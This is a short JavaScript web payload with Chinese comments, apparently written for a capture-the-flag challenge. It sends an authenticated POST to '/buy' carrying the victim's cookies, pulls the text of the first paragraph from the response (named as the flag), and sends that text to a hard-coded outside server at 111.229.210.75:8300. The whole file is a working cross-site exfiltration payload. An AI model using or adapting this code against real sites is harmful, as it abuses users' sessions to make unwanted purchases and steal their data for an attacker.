fetch("/buy", {
    method: "POST",
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: "id=1",
    credentials: 'include' // 确保携带cookie等身份凭证
})
.then(response => response.text())
.then(data => {
    const parser = new DOMParser();
    const htmlDocument = parser.parseFromString(data, "text/html");
    const pElements = htmlDocument.getElementsByTagName("p");
    let flagContent = "";

    if (pElements.length > 0) {
        flagContent = pElements[0].textContent; // 假设感兴趣的内容在第一个<p>标签
    }

    if (flagContent) {
        const targetUrl = `http://111.229.210.75:8300/${encodeURIComponent(flagContent)}`;
        fetch(targetUrl, { method: "GET" })
        .then(response => console.log("Content sent successfully"))
        .catch(error => console.error("Error sending content:", error));
    }
})
.catch(error => console.error("Error during the process:", error));
